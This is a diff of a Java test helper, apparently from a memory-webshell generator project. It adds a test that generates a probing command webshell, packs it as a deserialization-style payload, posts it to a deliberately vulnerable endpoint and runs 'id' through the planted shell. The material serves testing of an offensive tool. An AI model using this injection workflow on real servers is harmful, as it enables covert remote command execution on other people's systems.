@@ -6,6 +6,7 @@ import com.reajason.javaweb.godzilla.BlockingJavaWebSocketClient;
 import com.reajason.javaweb.godzilla.GodzillaManager;
 import com.reajason.javaweb.memshell.MemShellGenerator;
 import com.reajason.javaweb.memshell.MemShellResult;
+import com.reajason.javaweb.memshell.ShellTool;
 import com.reajason.javaweb.memshell.ShellType;
 import com.reajason.javaweb.memshell.config.*;
 import com.reajason.javaweb.packer.JarPacker;
@@ -27,6 +28,7 @@ import org.apache.commons.io.FileUtils;
 import org.apache.commons.lang3.RandomStringUtils;
 import org.apache.commons.lang3.StringUtils;
 import org.apache.commons.lang3.tuple.Pair;
+import org.hamcrest.Matchers;
 import org.testcontainers.containers.Container;
 import org.testcontainers.containers.GenericContainer;
 import org.testcontainers.utility.MountableFile;
@@ -185,11 +187,7 @@ public class ShellAssertion {
                 godzillaIsOk(shellUrl, ((GodzillaConfig) generateResult.getShellToolConfig()));
                 break;
             case Command:
-                if (shellType.endsWith(ShellType.WEBSOCKET)) {
-                    webSocketCommandIsOk(shellUrl, "id");
-                } else {
-                    commandIsOk(shellUrl, ((CommandConfig) generateResult.getShellToolConfig()), "id");
-                }
+                commandIsOk(shellUrl, shellType, ((CommandConfig) generateResult.getShellToolConfig()).getParamName(), "id");
                 break;
             case Behinder:
                 behinderIsOk(shellUrl, ((BehinderConfig) generateResult.getShellToolConfig()));
@@ -227,11 +225,15 @@ public class ShellAssertion {
     }
 
     @SneakyThrows
-    public static void commandIsOk(String entrypoint, CommandConfig shellConfig, String payload) {
+    public static void commandIsOk(String entrypoint, String shellType, String paramName, String payload) {
+        if (shellType.endsWith(ShellType.WEBSOCKET)) {
+            webSocketCommandIsOk(entrypoint, payload);
+            return;
+        }
         OkHttpClient okHttpClient = new OkHttpClient();
         HttpUrl url = Objects.requireNonNull(HttpUrl.parse(entrypoint))
                 .newBuilder()
-                .addQueryParameter(shellConfig.getParamName(), payload)
+                .addQueryParameter(paramName, payload)
                 .build();
         Request request = new Request.Builder()
                 .url(url)
@@ -402,5 +404,44 @@ public class ShellAssertion {
             case XalanAbstractTransletPacker -> VulTool.postIsOk(url + "/jackson", content);
             default -> throw new IllegalStateException("Unexpected value: " + packer);
         }
+    }
+
+    public static void testProbeInject(String url, String server, String serverVersion, String shellType, int targetJdkVersion) {
+        String shellTool = ShellTool.Command;
+        Packers packer = Packers.BigInteger;
+        Pair<String, String> urls = ShellAssertion.getUrls(url, shellType, shellTool, packer);
+        String shellUrl = urls.getLeft();
+        String urlPattern = urls.getRight();
+        ShellConfig shellConfig = ShellConfig.builder()
+                .server(server)
+                .serverVersion(serverVersion)
+                .shellType(shellType)
+                .shellTool(shellTool)
+                .targetJreVersion(targetJdkVersion)
+                .debug(false)
+                .probe(true)
+                .build();
+        InjectorConfig injectorConfig = InjectorConfig.builder()
+                .urlPattern(urlPattern)
+                .staticInitialize(true)
+                .build();
+        String paramName = "tomcatProbe" + shellType;
+        CommandConfig commandConfig = CommandConfig.builder()
+                .paramName(paramName)
+                .build();
+        MemShellResult generateResult = MemShellGenerator.generate(shellConfig, injectorConfig, commandConfig);
+        String content = packer.getInstance().pack(generateResult.toClassPackerConfig());
+        String res = VulTool.postIsOk(url + "/biginteger", content);
+        assertThat(res, anyOf(
+                Matchers.containsString("context: "),
+                Matchers.containsString("server: "),
+                Matchers.containsString("channel: ")
+
+        ));
+        ShellAssertion.commandIsOk(shellUrl, shellType, paramName, "id");
+    }
+
+    public static void testProbeInject(String url, String server, String shellType, int targetJdkVersion) {
+        testProbeInject(url, server, null, shellType, targetJdkVersion);
     }
 }
